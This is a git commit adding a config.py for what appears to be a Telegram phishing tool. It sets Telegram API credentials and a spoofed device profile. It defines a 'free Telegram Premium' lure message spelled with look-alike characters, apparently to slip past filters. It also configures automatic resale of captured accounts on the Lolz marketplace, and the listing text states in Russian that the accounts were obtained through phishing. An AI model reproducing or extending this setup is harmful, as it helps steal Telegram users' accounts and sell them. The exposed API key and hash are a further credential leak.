98a41cb23a90a1bd4b4aa986e995207210ea7629
Ftuzz <132849701+Ftuzz@users.noreply.github.com>
2024-12-03 17:16:02 +0500

    Add files via upload

---
+++ config.py
@@ -0,0 +1,21 @@
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+
+api_id = 28466978 
+api_hash = "e9e17eaa764fb0419a7d70df2226e2a7"
+device_model = "999 SM-G998B"
+system_version = "SDK 31"
+app_version = "8.4.1 (2522)"
+lang_code = "en"
+system_lang_code = "en-US"
+
+SEND_MSG = '@{username} — Бесплатный TeIеgrам prеmiuм 🎁'
+
+# Lolz Setting
+AUTO_SELL_LOLZ = False
+LOLZ_KEY = ''
+LOLZ_ACCOUNT_PRICE = 11
+LOLZ_ACCOUNT_PREMIUM_PRICE = 80
+LOLZ_ACCOUNT_TITLE = 'Телеграм | Прямо с печки | Лучшее качество'
+LOLZ_ACCOUNT_ORIGIN = 'fishing'
+LOLZ_ACCOUNT_DESCRIPTION = 'Этот аккаунт добыт через фишинг'
